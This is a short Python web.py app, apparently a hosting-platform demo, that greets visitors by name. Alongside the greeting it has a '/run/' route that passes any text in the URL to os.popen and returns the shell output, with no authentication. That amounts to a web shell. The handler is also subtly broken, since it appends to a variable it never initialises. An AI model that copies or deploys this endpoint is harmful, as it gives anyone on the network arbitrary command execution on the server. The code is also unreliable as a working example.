import web, os

urls = (
    '/run/(.*)', 'runcommand',
    '/(.*)', 'hello'
)
app = web.application(urls, globals())

class hello:
    def GET(self, name):
        if not name:
            name = 'Mopaas'
        return 'Hello, ' + name + '!'

class runcommand:
    str=''
    def GET(self, command):
        if not command:
            return
        tmp = os.popen(command).readlines()
        for line in tmp:
            str += line
            str += '<br/>'
        return str

application = app.wsgifunc()
